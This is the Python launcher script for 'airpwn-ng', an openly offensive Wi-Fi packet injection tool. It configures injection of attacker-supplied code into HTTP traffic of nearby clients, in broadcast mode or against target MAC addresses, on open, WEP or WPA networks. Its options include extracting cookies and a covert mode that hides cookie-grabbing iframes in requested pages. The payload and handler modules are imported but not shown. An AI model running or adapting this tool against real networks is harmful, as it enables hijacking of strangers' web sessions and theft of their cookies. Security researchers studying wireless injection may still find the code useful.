#! /usr/bin/python3

import argparse
import logging
import os
import signal
import subprocess
import sys
from lib.logger import Tee as tee
from lib.styles import File
from lib.visuals import Bcolors

def channelSet(nic, chan):
    """Set the channel for a given NIC"""
    subprocess.call('iwconfig {0} channel {1}'.format(nic, chan), shell = True)

def crtlC(args):
    """Handle CTRL+C."""
    def tmp(signal, frame):
        print (Bcolors.FAIL + '\n[!] Stopping injection and exiting airpwn-ng ...' + Bcolors.ENDC)
        if args.l:
            print (Bcolors.OKGREEN + '\n[+] Output log stored to ' + Bcolors.WARNING + '{0}'.format(str(args.l)) + Bcolors.ENDC)
        sys.exit(0)
    return tmp


def injection_check(args):
    """Injection file check"""
    try:
        f = open(args.injection, 'r')
        f.close()
    except:
        print (Bcolors.FAIL + '[!] Selected injection file', args.injection, 'does not exist.' + Bcolors.ENDC)
        exit(1)
    print (Bcolors.OKGREEN + '[+] Loaded injection file {0}'.format(str(args.injection)) + Bcolors.ENDC)
    injection = 1
    return injection


def main(args):
    """Launching logic"""

    ## Backpressure defaults
    if args.w is not None:
        args.bWarn = int(args.w)
    else:
        args.bWarn = 40

    ## Logging
    if args.l is not None:
        stdOut = sys.stdout
        sys.stdout = sys.stderr
        sys.stderr = stdOut
        oLog = open(args.l, 'w')
        sys.stdout = tee(stdOut, oLog)

    ## Enforce BSSID if WEP is chosen
    if args.wep is not None and args.bssid is None:
        print ('--wep requires --bssid\n')
        sys.exit(1)

    ## Enforce BSSID and ESSID if WPA is chosen
    if args.wpa is not None and (args.bssid is None or args.essid is None):
        print ('--wpa requires --bssid and --essid\n')
        sys.exit(1)

    ## Lowercase BSSID
    if args.bssid is not None:
        args.bssid = args.bssid.lower()

    ## Packet size
    ## Observed packet lengths for a GET /
    ## Can change depending upon NIC
    ## Defaults have been set 4 bytes lower as a precaution
    ## Adjust based according to your needs, or use -s 0
    ## WPA TKIP  -- 216
    ## WPA AES   -- 212
    ## WPA2 TKIP -- 216
    ## WPA2 AES  -- 212
    ## WEP       -- 204
    ## Open      -- 196

    if args.wpa is not None:
        if args.s is None:
            args.s = 208
    elif args.wep is not None:
        if args.s is None:
            args.s = 200
        else:
            args.s = int(args.s)
    else:
        if args.s is None:
            args.s = 192
        else:
            args.s = int(args.s)

    ## NIC types
    if args.inj is None:
        args.inj = 'mon'
    if args.mon is None:
        args.mon = 'mon'

    ## User printouts
    print ('\nairpwn-ng - The new and improved 802.11 packet injector\n')

    ### Add error checks
    ## Set channel if so desired
    if args.channel is not None:
        print (Bcolors.OKGREEN + '[+] Setting NIC Channel(s) to %s' % args.channel + Bcolors.ENDC)

        ## Set monitor nic
        if args.mon == 'mon':
            channelSet(args.m, args.channel)

        ## Set injector nic
        if args.inj == 'mon':
            channelSet(args.i, args.channel)

    ## Injection Logic
    # injection = 0
    injection = injection_check(args)

    ## Broadcast mode
    if args.t is None:
        print (Bcolors.WARNING + '[!] You are starting your attack in broadcast mode.')
        print ('[!] This means you will inject packets into all clients you are able to detect.')
        print ('[!] Use with caution.' + Bcolors.ENDC)

    ## Targeted mode
    else:
        if len(args.t) == 0:
            print (Bcolors.WARNING + '[!] You must specify at least one target MAC address with -t for targeted mode')
            exit(1)
        else:
            for target in args.t:
                print (Bcolors.OKGREEN + '[+] Adding target ' + Bcolors.OKBLUE + target + Bcolors.ENDC)

    ## Injection file used
    style = File()

    ## Launch the handler
    style.handler(args)


if __name__ == '__main__':
    ## ARGUMENT PARSING
    parser = argparse.ArgumentParser(description = 'airpwn-ng - the new and improved 802.11 packet injector')
    group = parser.add_mutually_exclusive_group(required = True)

    group.add_argument('--cm',
                       metavar = '<filename>',
                       help = 'Extract cookies from the DB')
    group.add_argument('--injection',
                       metavar = '<filename>',
                       help = 'File with your injection code')

    parser.add_argument('-b',
                        action = 'store_true',
                        help = 'Sniff both ways')
    parser.add_argument('-i',
                        metavar = '<interface>',
                        help = 'Your injection interface')
    parser.add_argument('-l',
                        metavar = '<outfile>',
                        help = 'Logfile')
    parser.add_argument('-m',
                        metavar = '<interface>',
                        help = 'Your monitor interface')
    parser.add_argument('-s',
                        metavar = '<pkt size>',
                        help = 'minimum size packet to decipher')
    parser.add_argument('-t',
                        nargs = '*',
                        metavar = '<MAC address>',
                        help = 'Target MAC addresses')
    parser.add_argument('-w',
                        help = 'Backpressure value')
    parser.add_argument('--bssid',
                        metavar = '<tgt BSSID>',
                        help = 'Target BSSID')
    parser.add_argument('--channel',
                        metavar = '<channel>',
                        help = 'Set the channel for the NICs')
    parser.add_argument('--covert',
                        action = 'store_true',
                        help = 'Hides cookie grabbing iframes inside the requested page')
    parser.add_argument('--essid',
                        metavar = '<tgt ESSID>',
                        help = 'Target ESSID')
    parser.add_argument('--inj',
                        choices = ['mon', 'man'],
                        metavar = '<inj NIC type>',
                        help = 'Injector NIC type - mon or man')
    parser.add_argument('--mon',
                        choices = ['mon', 'man'],
                        metavar = '<mon nic type>',
                        help = 'Monitor NIC type - mon or man')
    parser.add_argument('--single',
                        action = 'store_true',
                        help = 'Single packet injection attempt')
    parser.add_argument('--trigger',
                        metavar = '<trigger>',
                        help = 'Trigger string for injection')
    parser.add_argument('--wep',
                        metavar = '<wep password>',
                        help = 'Password for WEP')
    parser.add_argument('--wpa',
                        metavar = '<wpa password>',
                        help = 'Password for WPA')
    args = parser.parse_args()

    ## ADD SIGNAL HANDLER
    signal_handler = crtlC(args)
    signal.signal(signal.SIGINT, signal_handler)

    ## Launch
    main(args)
